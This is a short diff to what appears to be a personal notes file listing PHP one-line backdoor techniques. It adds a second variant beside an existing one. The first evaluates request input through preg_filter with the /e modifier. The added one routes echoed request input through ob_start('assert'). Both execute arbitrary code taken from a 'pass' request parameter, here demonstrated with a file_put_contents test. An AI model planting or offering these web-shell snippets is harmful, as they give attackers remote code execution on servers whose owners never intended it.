@@ -2,5 +2,12 @@ liuyislogin
 589dae7af22d8570c0ee3b36782b1b16
 
 bd:
+1.
 $_REQUEST['pass'] = 'file_put_contents("1.22","22")';
 preg_filter('|.*|e', $_REQUEST['pass'], '');
+
+2.
+$_REQUEST['pass'] = 'file_put_contents("1.22","22")';
+ob_start('assert');
+echo $_REQUEST['pass'];
+ob_end_flush();
